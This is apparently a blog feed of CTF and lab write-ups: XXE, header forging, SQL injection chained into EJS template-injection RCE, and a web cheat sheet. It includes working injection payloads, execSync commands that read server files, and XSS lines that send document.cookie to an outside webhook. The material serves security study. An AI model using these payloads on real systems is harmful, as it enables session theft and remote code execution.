&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input
取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
:::spoiler XXE course lecture
&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
:::
:::spoiler exploit type
&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
 if (!$xmlfile) die(show_source(__FILE__));

 $dom = new DOMDocument();
 $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
 $creds = simplexml_import_dom($dom);
 $user = $creds-&amp;gt;user;
 echo &amp;#34;You have logged in as user $user&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
 Exploit - XXE
 &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Normal Usage in this webpage&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
 Simple Web 0x23(Lab - XXE)
 &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input
取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
:::spoiler XXE course lecture
&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
:::
:::spoiler exploit type
&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
 if (!$xmlfile) die(show_source(__FILE__));

 $dom = new DOMDocument();
 $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
 $creds = simplexml_import_dom($dom);
 $user = $creds-&amp;gt;user;
 echo &amp;#34;You have logged in as user $user&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
 Exploit - XXE
 &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Normal Usage in this webpage&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</guid><description>&lt;h1 id="simple-web-0x24lab---how2http">
 Simple Web 0x24(Lab - how2http)
 &lt;a class="anchor" href="#simple-web-0x24lab---how2http">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">show_source&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">include&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;flag.php&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">elseif&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($_COOKIE[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;admin&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Not admim&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>( $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REQUEST_METHOD&amp;#34;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;FLAG&amp;#34;&lt;/span> ) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;u don&amp;#39;t need flag?&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($ip &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">echo&lt;/span> $FLAG;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;NOPE!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>主要是參考之前寫過的&lt;a href="https://hackmd.io/@SBK6401/B135SD0w2">PicoCTF - Who are you?&lt;/a>和&lt;a href="https://hackmd.io/@SBK6401/Syct_Ol0i#Challenge-picobrowser%F0%9F%8D%B0">PicoCTF - Who are you?&lt;/a>，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/H14qGKvrp.png" alt="圖片" />&lt;/p></description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</guid><description>&lt;h1 id="simple-web-0x412023-hw---double-injection---flag1">
 Simple Web 0x41(2023 HW - Double Injection - FLAG1)
 &lt;a class="anchor" href="#simple-web-0x412023-hw---double-injection---flag1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Time Based SQLi
:::info
建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler init-db.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;fs&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;sqlite3&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">verbose&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">FLAG1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">readFileSync&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/flag1.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;utf8&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">trim&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span>.&lt;span style="color:#a6e22e">Database&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/etc/db.sqlite3&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">db&lt;/span>.&lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">DROP TABLE IF EXISTS users;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">CREATE TABLE db (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> users JSON NOT NULL
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">INSERT INTO db(users) VALUES (&amp;#39;{
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;admin&amp;#34;: {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;admin&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">FLAG1&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> },
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;guest&amp;#34;: {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;guest&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;guest&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> }
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">}&amp;#39;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">`&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler Dockerfile&lt;/p></description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</guid><description>&lt;h1 id="simple-web-0x422023-hw---double-injection---flag2">
 Simple Web 0x42(2023 HW - Double Injection - FLAG2)
 &lt;a class="anchor" href="#simple-web-0x422023-hw---double-injection---flag2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Node JS ejs SSTI&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
&lt;img src="https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png" alt="" />
基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- #
&lt;/code>&lt;/pre>&lt;p>後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看&lt;a href="https://hackmd.io/@SBK6401/HkgkDNsPp">之前寫的文章&lt;/a>&lt;/p>
&lt;h2 id="exploit---ejs-ssti-rce">
 Exploit - Ejs SSTI RCE
 &lt;a class="anchor" href="#exploit---ejs-ssti-rce">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Payload 1:
&lt;ul>
&lt;li>Username:
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;ls -al /&amp;#34;).toString() %&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
&lt;li>Result:
&lt;pre tabindex="0">&lt;code>total	76	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	
-rwxr-xr-x	1	root	root	0		Dec	18	18:54	.dockerenv	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	
drwxr-xr-x	5	root	root	340		Dec	18	18:54	dev	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	
-rw-r--r--	1	root	root	28		Dec	18	17:15	flag1.txt	
-rw-r--r--	1	root	root	23		Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	
drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	
drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	
dr-xr-xr-x	497	root	root	0		Dec	18	18:54	proc	
drwx------	1	root	root	4096	Dec	11	18:36	root	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	
dr-xr-xr-x	13	root	root	0		Dec	18	18:54	sys	
drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	
drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	
drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Payload 2:
&lt;ul>
&lt;li>Username:
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;cat /flag2-1PRmDsTXoo3uPCdq.txt&amp;#34;).toString() %&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
&lt;li>Result: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/p></description></item><item><title>Simple Welcome - 0x04(Lab - Script)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</guid><description>&lt;h1 id="simple-welcome---0x04lab---script">
 Simple Welcome - 0x04(Lab - Script)
 &lt;a class="anchor" href="#simple-welcome---0x04lab---script">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://pyscript.ctf.zoolab.org/">https://pyscript.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 if(!isset($_FILES[&amp;#34;file&amp;#34;]))
 highlight_file(__file__) &amp;amp;&amp;amp; die();
 $flag = file_get_contents(&amp;#39;/flag&amp;#39;);
 $node = @`node {$_FILES[&amp;#34;file&amp;#34;][&amp;#34;tmp_name&amp;#34;]} 2&amp;gt;&amp;amp;1`;
 $python = @`python3 {$_FILES[&amp;#34;file&amp;#34;][&amp;#34;tmp_name&amp;#34;]} 2&amp;gt;&amp;amp;1`;
 if($flag === $node &amp;amp;&amp;amp; $flag === $python)
 echo &amp;#39;Here is your Flag: &amp;#39;.$flag;
 else
 echo &amp;#39;Fail :(&amp;#39;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;p>Must write a script that can be executed in python and node language simultaneously.&lt;/p></description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</guid><description>&lt;h1 id="sqli---apprentice">
 SQLi - APPRENTICE
 &lt;a class="anchor" href="#sqli---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">
 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 &lt;a class="anchor" href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: &lt;code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20#&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/pPKFYKj.png" alt="" />
:::&lt;/p></description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</guid><description>&lt;h1 id="web-cheat-sheet">
 Web Cheat Sheet
 &lt;a class="anchor" href="#web-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools">
 Online Tools
 &lt;a class="anchor" href="#online-tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Fuck&lt;/th>
 &lt;th>Beautifier&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="http://www.jsfuck.com/">jsfuck&lt;/a>&lt;/td>
 &lt;td>&lt;a href="http://www.jsnice.org/">JSNice&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://utf-8.jp/public/jjencode.html">jjencode&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://beautifier.io/">JS 反混淆器&lt;/a>: 可以反混淆或解密JS的檔案&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://utf-8.jp/public/aaencode.html">aaencode&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://js.wfuapp.com/">JS 壓縮+加密+混淆+美化&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://esolangs.org/wiki/Language_list">Esolang List&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://www.53lu.com/tool/jsfuckdecode/">JS Fuck Decode&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">aadecode&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="cheat-sheet">
 Cheat-Sheet
 &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS-CheatSheet&lt;/a>
利用XSS把session打到webhook上:
&lt;pre tabindex="0">&lt;code class="language-javascript?" data-lang="javascript?">window.location=&amp;lt;requestbin.com&amp;gt;/?a+document.cookie
// or
fetch(&amp;#34;https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194&amp;#34;, { method: &amp;#39;GET&amp;#39;, headers: { &amp;#39;Cookie&amp;#39;: document.cookie } })
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md">All-Injection&lt;/a>&lt;/li>
&lt;li>SSTI Payload: 記得找==os._wrap_close==
&lt;pre tabindex="0">&lt;code>{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[&amp;#39;system&amp;#39;](&amp;#39;id&amp;#39;)}}
{{self.__init__.__globals__.__builtins__.__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;cat%20Flag.txt&amp;#34;).read()}}
